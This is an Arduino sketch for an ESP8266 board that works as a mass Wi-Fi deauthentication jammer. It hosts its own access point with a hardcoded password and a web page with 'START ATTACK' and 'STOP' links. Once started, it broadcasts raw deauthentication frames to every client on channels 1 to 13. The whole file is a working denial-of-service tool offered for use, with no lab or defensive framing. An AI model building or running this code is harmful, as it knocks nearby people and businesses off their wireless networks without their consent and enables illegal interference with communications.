#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h> 

// Fungsi Inti Serangan SDK 2.0.0
extern "C" {
  void wifi_set_channel(uint8 channel);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

const char* admin_ssid = "GMpro86_V8";
const char* admin_pass = "sangkur87";

ESP8266WebServer server(80);
DNSServer dnsServer;
bool massDeauthActive = false;

void setup() {
  SPIFFS.begin();
  pinMode(2, OUTPUT); 
  digitalWrite(2, HIGH); 

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", [](){
    String html = "<html><body style='background:#000;color:#0f0;font-family:monospace;'>";
    html += "<h2>GM-PRO 86 READY</h2>";
    html += "<p><a href='/attack' style='color:#f00;'>[ START ATTACK ]</a></p>";
    html += "<p><a href='/stop' style='color:#fff;'>[ STOP ]</a></p>";
    html += "</body></html>";
    server.send(200, "text/html", html);
  });

  server.on("/attack", [](){
    massDeauthActive = true;
    server.send(200, "text/html", "ATTACK ACTIVE. <a href='/'>Back</a>");
  });

  server.on("/stop", [](){
    massDeauthActive = false;
    digitalWrite(2, HIGH);
    server.send(200, "text/html", "STOPPED. <a href='/'>Back</a>");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (massDeauthActive) {
    digitalWrite(2, !digitalRead(2)); 
    uint8_t pkt[26] = {0xc0,0,0x3a,0x01, 0xff,0xff,0xff,0xff,0xff,0xff, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,1,0};
    for (int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      for (int i=0; i<15; i++) { 
        wifi_send_pkt_freedom(pkt, 26, 0); 
        delay(1); 
      }
      yield();
    }
  }
}
